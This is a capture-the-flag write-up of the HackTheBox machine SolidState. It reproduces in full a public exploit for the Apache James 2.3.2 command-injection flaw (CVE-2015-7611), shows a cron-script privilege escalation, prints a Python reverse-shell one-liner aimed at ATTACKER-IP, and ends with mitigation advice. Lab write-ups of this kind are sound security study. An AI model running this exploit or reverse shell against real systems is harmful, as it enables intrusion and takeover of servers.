---
title: "HackTheBox - SolidState (Medium) writeup"
date: 2021-9-04
layout: single
tags:
  - HackTheBox
  - writeups
---
TL;DR: HackTheBox's SolidState machine is a medium-difficulty machine that serves Apache James 2.5.2 which is vulnerable to CVE-2015-7611. The vulnerability allows for RCE and eventually access to the underlying server. Privilege escalation to root was through a privileged cron job with write permissions for unprivileged users.

## Quick disclaimer

My writeups are intended to showcase my understanding of various security concepts and my thought process when solving a problem. Hopefully they would also improve my technical-writing skills, which I believe is an extremely underrated skill in our industry. I also share some analysis of vulnerabilites and what can be done to resolve or mitigate them. These are not intended to be tutorials or walkthroughs.

---

Welcome to my first HackTheBox writeup!

This is my first atttempt to write about machines and challenges I have completed on HackTheBox and TryHackMe.

![](/assets/writeups/HTB-SolidState/SolidState-icon.png)

## Reconnaissance

The first thing I normally do is create a new directory tree for the current machine I am working on.

```bash
cd /opt/hackthebox
mkdir -p SolidState/{nmap,exploits,downloads} && cd SolidState
```

Now for the initial Nmap scan, I like to scan common ports just to have a basic idea of what's going on, and then as needed, adjust the scan scope.

 * -sC: this runs basic nmap scripts
 * -sV: detect versions
 * -oA: generate output files (all formats). This is very useful for checking the output later.

![](/assets/writeups/HTB-SolidState/nmap_1.png)

Great, I can see `22/ssh`, `25/smtp`, `80/http`, `110/pop3`, and `119/nntp` open, and some basic information about the service running on port 80.

## Enumeration

### 80/http

First, I enumerate the website listening on port 80.

![](/assets/writeups/HTB-SolidState/80_1.png)

Further clicking around, I found the contact page:

![](/assets/writeups/HTB-SolidState/80_2.png)

The email address looked interesting to me:

`webadmin@solid-state-security.com`

I took note of this piece of information, and also added the domain to my /etc/hosts.

```
echo "10.129.29.189 solid-state-security.com" | sudo tee -a /etc/hosts
```

I know that the address and the phone number could be interesting in an actual pentest activity. Looking at the HTML code and proxying the traffic through Burp could be useful as well, but for now, I moved on and checked the website again using the domain name, but it looked like the same website.

At this point, I wanted to know what's running the SMTP service listening on port 25, and see what capabilities it had to offer.

![](/assets/writeups/HTB-SolidState/25_1.png)

There was not much I can do here, but one important piece of information showed up, which was the SMTP server software and its version:

> James SMTP Server 2.3.2

At first I did not know what James SMTP Server was, but with a quick web search, I found that it is an Apache email product intended for enterprise use and scale.

A quick `searchsploit` showed a [public exploit](https://www.exploit-db.com/exploits/35513) for Apache James which also matched the version:

![](/assets/writeups/HTB-SolidState/searchsploit.png)

### Vulnerability Analysis

The vulnerability is tracked under the following:

- CVE: [CVE-2015-7611](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7611)
- Description: Apache James Server 2.3.2 - Arbitrary Command Execution.
- CVSS 3.x score: 8.1 (High)
- CWE ID: CWE-78
- CWE Description: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Great! I not only have found the vulnerability that allows for an RCE, but also PoC code. Before running an exploit, however, I would normally try to understand what the vulnerability is about (to the best of my understanding), and what the exploit PoC does. Reading throught the PoC code and blog posts about the vulnerability, these are what I came up with:

- Use of default username and password: `root/root`.

- Arbitrary file write due to a lack of (or insufficient) input validation when adding new mail users, resulting in remote code execution.

- James remote management is exposed and listens on port 4555, which of course did not show up in my initial NMAP scan since I only scanned the top ports.

- The exploit will connect to this port and login using the default credentials, create a user with username `../../../../../../../../etc/bash_completion.d`.

- The exploit will then connect to `25/smtp` to send an email to this user containing a payload, and the email which contains the payload will be dropped to `bash_completion.d/`.

- When a user logs in, the payload gets executed through bash completion.

  ![](/assets/writeups/HTB-SolidState/py_1.png)

Notice that this is an exploit chain and has multiple conditions to be successful.

More detailed explanation of the vulnerability and reproduction steps can be found [here](https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html).

> A username such as "../../../../../../../../etc/bash_completion.d" can lead to files being placed in "/etc/bash_completion.d," a directory containing commands that execute when a user signs into the machine. By sending messages to this user, an attacker can execute commands that probe the mail server and retrieve data from it.

Verify that the Remote Administration service on port 4555 was actually reachable:

![](/assets/writeups/HTB-SolidState/4555.png)

It looks like the prerequisites for the exploit to succeed are met.

---

## Exploitation

### Running the exploit

I downloaded the exploit script using `searchsploit`:

`searchsploit -m linux/remote/35513.py`

Here is the full exploit script:

```python
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```

First, I would usually want to verify the exploit before attempting for a shell, either by running the PoC code or by hand.

When testing a vulnerable application, I would normally set up a virtual machine (using VirtualBox and Vagrant), install the vulnerable version, and then run the exploit against it. In this case, I just went ahead and took advantage of my HTB VIP+ subscription (personal instances, machine resets whenever I wanted). So I wrote a payload that would send me a callback.

![](/assets/writeups/HTB-SolidState/payload_1.png)

I then started tcpdump and then ran the script.

![](/assets/writeups/HTB-SolidState/tcpdump.png)

At this point, the payload should have already been delivered and would be triggered via bash completion when a user logs in to the server. Of course this was HTB and normally there are no simulated users, so I thought I needed to trigger the login myself. However, at this point I did not have a valid SSH user, so I went back to check something I have not explored yet: the admin account to the James SMTP server.

I tried to login to the service using the default credentials `root:root`:

![](/assets/writeups/HTB-SolidState/4555_login.png)

Since this service is new to me, I had to research what commands I can run. For that, HELP was enough, but there's also an available [documentation](https://james.apache.org/server/manage-cli.html) online.

Running `listusers`, I see a few users:

- james
- thomas
- john
- mindy
- mailadmin

I wanted to then read each users' email. To do that, I knew the easiest way was to change the user's password. I went ahead and changed each user's password and manually read their emails one-by-one, keeping in mind that in a real penetration test this might cause a disruption to end-users, might be out-of-scope, and might even trigger a secity event which would lead to being caught and compromise a pentest engagement.

Moving forward, the first user I checked was `thomas`, but they had no email.

![](/assets/writeups/HTB-SolidState/james_thomas.png)

I got a break with the following email on `john`'s mailbox, which was an email from James instructing John to send Mindy, a new hire, to restrict her account and send a temporary password.

![](/assets/writeups/HTB-SolidState/james_mindy.png)

Checking on `mindy`'s account, I found the email from James containing the temporary credentials:

![](/assets/writeups/HTB-SolidState/james_mindy2.png)

> P@55W0rd!2@

I thought that if I were lucky, Mindy wasn't fully onboarded yet, and the temporary credentials were not yet changed. There was only one way to find out, so I SSH'd to mindy's account:

![](/assets/writeups/HTB-SolidState/mindy_1.png)

Perfect! There's the user flag of course, and I also noticed that I was in rbash, a restricted shell environment.

Checking on the running tcpdump, I got the callback:

![](/assets/writeups/HTB-SolidState/tcpdump2.png)

At this point, I was able to verify that the exploit works and that I can get a callback to my attacker machine. I knew I was ready to send my reverse shell payload.

### Initial Foothold

The reverse TCP payload I used was as follows:

![](/assets/writeups/HTB-SolidState/payload_2.png)

Now run the python script:

![](/assets/writeups/HTB-SolidState/py2.png)

Logged-in to `mindy`'s account via SSH again. Reverse shell received:

![](/assets/writeups/HTB-SolidState/reverse_shell.png)

Get out of the dumb shell:

![](/assets/writeups/HTB-SolidState/reverse_shell_2.png)

### Privilege Escalation

My goto-tool for Linux PE is `linPeas`. However, the PE went fairly easily when I found `/opt/tmp.py` from manually looking around and while waiting for linPeas to complete.

```python
#!/usr/bin/env python
import os
import sys
try:
    os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

My evaluation of the script:

- The file was owned by `root` but it was world-writeable.
- It is a cleanup script that removes everything inside /tmp.
- SUID bit was not set, so there had to be another way it gets executed. This thought combined with my years of experience as a sysadmin, I asserted that this script was most likely scheduled by `cron`.
- I assumed that the schedule duration was low enough for a CTF-style machine.

To validate this theory, I created a file in `/tmp`, then waited for it to disappear, and it did after a couple of minutes. Finally, to accomplish my goal of getting the root flag, I added a simple command invocation to grab the flag and write it to a readable file:

```bash
echo "os.system('cp -p /root/root.txt /opt/root.txt && chmod 777 /opt/root.txt')" >> /opt/tmp.py
```

---

## Recommendations

Finally, here are my recommendations to resolve the findings for this box:

1. Apply timely security updates

    The (arguably) easiest method of fixing this vulnearbility is to update Apache James to the latest supported version. Patch management process is invaluable for dealing with software vulnerabilities. Email is a critical service and applying patches can easily mean downtime, and so a properly-established and tested process helps balance the downtime cost to users while helping ensure applications have the latest security patches.

2. Restrict the James Administration console

    Access to administration console should be restricted at the network layer. Port `4555` should only be accessible either locally or from a management subnet.

3. Change default credentials

    The Apache James administration service was using the default credentials `root:root`. Always change default passwords before making an application available for remote access and especially before deploying it for production use.

4. Disable banners

    What made this machine relatively easy was the welcome banner on the SMTP port which included the vulnerable version of Apache James. Of course, disabling welcome banners prevents no one from enumerating further, but it definitely slows down attacks.

5. Prevent unauthenticated email relay

    The specific PoC from `exploitdb` basically is an exploit chain, which requires login to the SMTP service to send an email to a victim. This could be prevented by requiring mail users to login first. In combination to recommendation #2, this would have been hard to bypass.

6. Secure scripts running as a privileged user

    Scripts running as a privileged user should be properly secured to prevent tampering with. Some tips are to remove write permission to the script and to remove write permission to the directory containing the script.

---

## Final thoughts

While writing this article, there are some things that I could have done better:

- Use a tool such as [pspy](https://github.com/DominicBreuker/pspy) which will help monitor when cron jobs get executed. This is useful when you cannot see the cron jobs of other privileged users such as root, and if the timing of the cron jobs is not easily discernable.

- Spawn a root shell as a proof of full-system access. An example Python script which will spawn a reverse shell when executed from root:

    ```
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4554));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```

Thanks for reading my post! I would love to hear your feedback, message me on [Twitter](https://twitter.com/pidnull) or send an issue for this [repo](https://github.com/guerzon/guerzon.github.io/issues/new).
